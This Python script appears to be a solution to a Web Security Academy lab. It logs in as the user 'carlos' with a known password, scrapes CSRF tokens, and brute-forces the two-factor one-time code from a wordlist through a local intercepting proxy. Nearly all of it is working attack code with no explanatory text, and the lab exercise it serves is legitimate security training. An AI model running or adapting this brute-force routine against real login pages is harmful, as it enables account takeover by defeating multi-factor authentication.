import requests
from bs4 import BeautifulSoup
import sys

proxy = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}


login1_url = "https://acfe1ffe1f21bf06c0042e7200cc00e7.web-security-academy.net/login"
login2_url = "https://acfe1ffe1f21bf06c0042e7200cc00e7.web-security-academy.net/login2"
session = requests.session()

def post_login(url,csrf_token,session_cookie):
	post_data = {'csrf':{csrf_token},'username':'carlos','password':'montoya'}
	r = requests.session()
	response = session.post(url,data=post_data,cookies=session_cookie)
	session_cookie = session.cookies.get_dict()

	return session_cookie



def get_login(url):
	r = requests.session()
	response = session.get(url)
	session_cookie = r.cookies.get_dict()
	soup = BeautifulSoup(response.content, "html.parser")
	csrf_token = soup.find('input')['value']

	return csrf_token, session_cookie



def get_login2(url,session_cookie): #/login2
	r = requests.session()
	response = session.get(url, cookies=session_cookie)
	soup = BeautifulSoup(response.content, "html.parser")
	csrf_token = soup.find('input')['value']

	return csrf_token



def brute_force_otp(url,csrf_token,session_cookie):
	with open('otp.txt') as f:
		for otps in f:
			otp = otps.strip()
			sys.stdout.write(f"\r[+]OTP: {otp}")
			post_data = {'csrf':{csrf_token},'mfa-code':{otp}}
			#response = session.post(url,data=post_data,cookies=session_cookie)
			response = requests.post(url,data=post_data,cookies=session_cookie,proxies=proxy,verify=False)

			hit = "Invalid CSRF token (session does not contain a CSRF token)"

			if hit in response.text:
				csrf_token = get_csrf_token()
				post_data = {'csrf':{csrf_token},'mfa-code':{otp}}
				#response = session.post(url,data=post_data,cookies=session_cookie)
				response = session.post(url,data=post_data,cookies=session_cookie,proxies=proxy,verify=False)

			error_msg = "Incorrect security code"

			if error_msg not in response.text:
				print(f"[+]CRACKED OTP IS: {otp}")
				break



def get_csrf_token():
	csrf_token, session_cookie = get_login(login1_url)
	session_cookie = post_login(login1_url,csrf_token,session_cookie)
	csrf_token = get_login2(login2_url,session_cookie)

	return csrf_token



def main():
	csrf_token, session_cookie = get_login(login1_url)
	session_cookie = post_login(login1_url,csrf_token,session_cookie)
	csrf_token = get_login2(login2_url,session_cookie)
	brute_force_otp(login2_url,csrf_token,session_cookie)



if __name__=="__main__":
    main()
